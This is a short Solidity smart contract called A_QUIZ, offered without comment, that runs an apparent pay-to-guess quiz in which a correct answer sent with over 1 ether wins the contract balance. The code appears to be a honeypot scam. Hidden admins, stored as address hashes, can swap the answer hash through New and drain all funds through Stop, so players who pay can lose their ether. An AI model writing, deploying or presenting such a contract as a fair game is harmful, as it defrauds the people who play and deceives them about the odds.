1 contract A_QUIZ
2 {
3     function Try(string _response) external payable 
4     {
5         require(msg.sender == tx.origin);
6 
7         if(responseHash == keccak256(_response) && msg.value > 1 ether)
8         {
9             msg.sender.transfer(this.balance);
10         }
11     }
12 
13     string public question;
14 
15     bytes32 responseHash;
16 
17     mapping (bytes32=>bool) admin;
18 
19     function Start(string _question, string _response) public payable isAdmin{
20         if(responseHash==0x0){
21             responseHash = keccak256(_response);
22             question = _question;
23         }
24     }
25 
26     function Stop() public payable isAdmin {
27         msg.sender.transfer(this.balance);
28     }
29 
30     function New(string _question, bytes32 _responseHash) public payable isAdmin {
31         question = _question;
32         responseHash = _responseHash;
33     }
34 
35     constructor(bytes32[] admins) public{
36         for(uint256 i=0; i< admins.length; i++){
37             admin[admins[i]] = true;        
38         }       
39     }
40 
41     modifier isAdmin(){
42         require(admin[keccak256(msg.sender)]);
43         _;
44     }
45 
46     function() public payable{}
47 }